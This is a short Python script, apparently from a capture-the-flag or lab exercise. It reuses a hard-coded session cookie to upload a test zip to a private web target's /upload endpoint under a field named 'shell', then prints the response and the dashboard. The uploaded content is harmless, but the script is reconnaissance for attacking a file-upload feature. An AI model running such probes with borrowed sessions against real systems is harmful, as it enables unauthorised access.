import requests, zipfile, os
TARGET="http://10.65.146.116:5000"
S="eyJzdGFmZiI6ImNvbmNpZXJnZSJ9.apJuOQ.yWRtVVvgsw0Qk9NzdbGSakknWXI"
cookies={"session":S}

def up(name, files):
    z=f"{name}.zip"
    with zipfile.ZipFile(z,"w") as zf:
        for k,v in files.items(): zf.writestr(k,v)
    with open(z,"rb") as f:
        r=requests.post(f"{TARGET}/upload", files={"shell":(z,f,"application/zip")}, cookies=cookies)
    return r

# valid upload, dump full response
r = up("valid", {"shell.json":'{"assets":["a.png"]}', "a.png":"x"})
print("=== STATUS", r.status_code, "===")
print(r.text)
print("=== DASHBOARD ===")
d=requests.get(f"{TARGET}/dashboard", cookies=cookies)
print(d.text)
